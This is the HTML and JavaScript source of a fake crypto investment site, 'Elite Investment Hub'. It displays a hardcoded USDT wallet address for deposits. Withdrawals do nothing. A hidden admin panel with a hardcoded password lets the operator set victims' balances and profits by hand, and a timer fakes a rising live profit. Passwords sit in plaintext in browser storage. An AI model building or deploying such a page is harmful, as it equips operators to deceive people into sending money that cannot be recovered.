<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ELITE INVESTMENT HUB | Professional Trading</title>
    <script src="https://s3.tradingview.com/tv.js"></script>
    <style>
        :root {
            --primary: #22c55e;
            --bg-dark: #0b0f1a;
            --card-bg: rgba(255, 255, 255, 0.05);
            --text-gray: #94a3b8;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            background: var(--bg-dark);
            color: white;
            overflow-x: hidden;
        }

        /* Glassmorphism Styles */
        .card {
            background: var(--card-bg);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            padding: 25px;
            margin-bottom: 20px;
            border-radius: 15px;
            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
        }

        header {
            background: rgba(13, 27, 42, 0.9);
            padding: 15px;
            text-align: center;
            border-bottom: 1px solid var(--primary);
            position: sticky;
            top: 0;
            z-index: 1000;
        }

        .container { padding: 20px; max-width: 1200px; margin: auto; }

        button {
            padding: 12px;
            border: none;
            border-radius: 8px;
            background: var(--primary);
            color: white;
            font-weight: bold;
            width: 100%;
            cursor: pointer;
            transition: transform 0.2s;
        }

        button:active { transform: scale(0.98); }

        input, select {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border-radius: 8px;
            border: 1px solid #334155;
            background: #1e293b;
            color: white;
            box-sizing: border-box;
        }

        .progress { background: #334155; height: 10px; border-radius: 5px; margin-top: 10px; }
        .progress-bar { 
            height: 10px; 
            background: linear-gradient(90deg, #22c55e, #4ade80); 
            border-radius: 5px; 
            width: 0%; 
            transition: width 1.5s ease-in-out;
        }

        .status-active { color: #22c55e; font-weight: bold; }
        .status-inactive { color: #ef4444; font-weight: bold; }
        .hidden { display: none; }
        
        .grid-3 { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; }
        
        .wallet-box {
            background: #000;
            padding: 15px;
            border-radius: 8px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-family: monospace;
            border: 1px dashed var(--primary);
        }
    </style>
</head>
<body>

<header>
    <h2>ELITE INVESTMENT HUB</h2>
</header>

<div class="container">

    <div id="home">
        <div class="card" style="text-align: center;">
            <h1>Institutional Trading for Everyone</h1>
            <p style="color: var(--text-gray);">Secure, Automated, and Transparent Investment Solutions.</p>
            <button onclick="showPage('register')">Get Started</button>
            <button onclick="showPage('login')" style="background: transparent; border: 1px solid var(--primary); margin-top: 10px;">User Login</button>
            <p onclick="showPage('adminLogin')" style="font-size: 12px; cursor: pointer; color: #475569; margin-top: 20px;">Admin Access</p>
        </div>
    </div>

    <div id="register" class="hidden">
        <div class="card">
            <h3>Create Account</h3>
            <input id="regName" placeholder="Full Name">
            <input id="regPhone" placeholder="Phone Number">
            <input id="regPass" type="password" placeholder="Password">
            <button onclick="register()">Register</button>
            <button onclick="showPage('home')" style="background:#334155; margin-top:10px;">Back</button>
        </div>
    </div>

    <div id="login" class="hidden">
        <div class="card">
            <h3>Login</h3>
            <input id="loginPhone" placeholder="Phone Number">
            <input id="loginPass" type="password" placeholder="Password">
            <button onclick="login()">Access Dashboard</button>
            <button onclick="showPage('home')" style="background:#334155; margin-top:10px;">Back</button>
        </div>
    </div>

    <div id="adminLogin" class="hidden">
        <div class="card">
            <h3>Admin Authentication</h3>
            <input id="adminPass" type="password" placeholder="Admin Secret Key">
            <button onclick="adminLogin()">Unlock Portal</button>
        </div>
    </div>

    <div id="dashboard" class="hidden">
        <div class="grid-3">
            <div class="card">
                <h4 id="userName">Welcome</h4>
                <p>Account Status: <span id="status"></span></p>
                <div class="progress"><div id="progressBar" class="progress-bar"></div></div>
            </div>
            <div class="card">
                <p>Investment</p>
                <h2 id="investment">KES 0.00</h2>
            </div>
            <div class="card">
                <p>Live Profit</p>
                <h2 id="profit" style="color: var(--primary);">KES 0.00</h2>
            </div>
        </div>

        <div class="card">
            <h3>Market Overview</h3>
            <div id="tradingview_chart"></div>
        </div>

        <div class="grid-3">
            <div class="card">
                <h3>Deposit USDT (TRC20)</h3>
                <div class="wallet-box">
                    <span id="walletAddr">TPfoEwLhjW3pBokNSem1oTVEp26mNSvfPR</span>
                    <small style="color: var(--primary); cursor: pointer;" onclick="copyWallet()">COPY</small>
                </div>
                <input type="text" id="txHash" placeholder="Transaction Hash">
                <button onclick="alert('Notification sent to Admin!')">Confirm Transfer</button>
            </div>
            <div class="card">
                <h3>Withdraw</h3>
                <input type="number" placeholder="Amount">
                <input type="text" placeholder="Your Wallet Address">
                <button style="background: #334155;">Request Payout</button>
            </div>
        </div>
        <button onclick="logout()" style="background: #ef4444; width: auto; padding: 10px 30px;">Logout</button>
    </div>

    <div id="adminPanel" class="hidden">
        <div class="card">
            <h3>Manage Users</h3>
            <div id="userList"></div>
            <hr style="opacity: 0.1; margin: 20px 0;">
            <h3>Update Account</h3>
            <input id="aPhone" placeholder="User Phone">
            <input id="aInvestment" type="number" placeholder="Set Investment Amount">
            <input id="aProfit" type="number" placeholder="Set Profit">
            <input id="aProgress" type="number" placeholder="Set Progress %">
            <select id="aStatus">
                <option>Active</option>
                <option>Inactive</option>
            </select>
            <button onclick="saveUser()">Update Database</button>
            <button onclick="showPage('home')" style="background:#334155; margin-top:10px;">Exit Admin</button>
        </div>
    </div>

</div>

<script>
    let users = JSON.parse(localStorage.getItem("users")) || [];
    const ADMIN_PASSWORD = "elite123";

    function saveData() { localStorage.setItem("users", JSON.stringify(users)); }

    function showPage(pageId) {
        document.querySelectorAll('.container > div').forEach(div => div.classList.add('hidden'));
        document.getElementById(pageId).classList.remove('hidden');
        if(pageId === 'dashboard') loadChart();
    }

    function register() {
        let user = {
            name: regName.value, phone: regPhone.value, pass: regPass.value,
            investment: 0, profit: 0, withdrawals: 0, progress: 0, status: "Inactive"
        };
        users.push(user);
        saveData();
        alert("Account Created!");
        showPage('login');
    }

    function login() {
        let u = users.find(x => x.phone == loginPhone.value && x.pass == loginPass.value);
        if (u) {
            localStorage.setItem("currentUser", u.phone);
            loadDashboard();
        } else alert("Access Denied");
    }

    function loadDashboard() {
        showPage('dashboard');
        let phone = localStorage.getItem("currentUser");
        let u = users.find(x => x.phone == phone);
        document.getElementById("userName").innerText = "Welcome, " + u.name;
        document.getElementById("investment").innerText = "KES " + u.investment;
        document.getElementById("profit").innerText = "KES " + u.profit;
        document.getElementById("status").innerText = u.status;
        document.getElementById("status").className = u.status == "Active" ? "status-active" : "status-inactive";
        document.getElementById("progressBar").style.width = u.progress + "%";
    }

    // REAL-TIME PROFIT TICKER
    setInterval(() => {
        let phone = localStorage.getItem("currentUser");
        if (!phone) return;
        users = users.map(u => {
            if (u.phone === phone && u.status === "Active") {
                u.profit = parseFloat((u.profit + (u.investment * 0.00001)).toFixed(4));
                document.getElementById("profit").innerText = "KES " + u.profit;
            }
            return u;
        });
        saveData();
    }, 3000);

    function adminLogin() {
        if (adminPass.value == ADMIN_PASSWORD) {
            showPage('adminPanel');
            renderUsers();
        } else alert("Invalid Admin Key");
    }

    function saveUser() {
        let u = users.find(x => x.phone == aPhone.value);
        if (u) {
            u.investment = Number(aInvestment.value);
            u.profit = Number(aProfit.value);
            u.progress = Number(aProgress.value);
            u.status = aStatus.value;
            saveData();
            renderUsers();
            alert("Updated");
        } else alert("User not found");
    }

    function renderUsers() {
        let list = "<ul>";
        users.forEach(u => {
            list += `<li>${u.name} | ${u.phone} | Bal: ${u.investment} | Status: ${u.status}</li>`;
        });
        document.getElementById("userList").innerHTML = list + "</ul>";
    }

    function loadChart() {
        new TradingView.widget({
            "width": "100%", "height": 400, "symbol": "FX:EURUSD",
            "interval": "D", "timezone": "Etc/UTC", "theme": "dark",
            "style": "1", "locale": "en", "container_id": "tradingview_chart"
        });
    }

    function copyWallet() {
        navigator.clipboard.writeText("TPfoEwLhjW3pBokNSem1oTVEp26mNSvfPR");
        alert("Address Copied!");
    }

    function logout() { localStorage.removeItem("currentUser"); showPage('home'); }
</script>

</body>
</html>

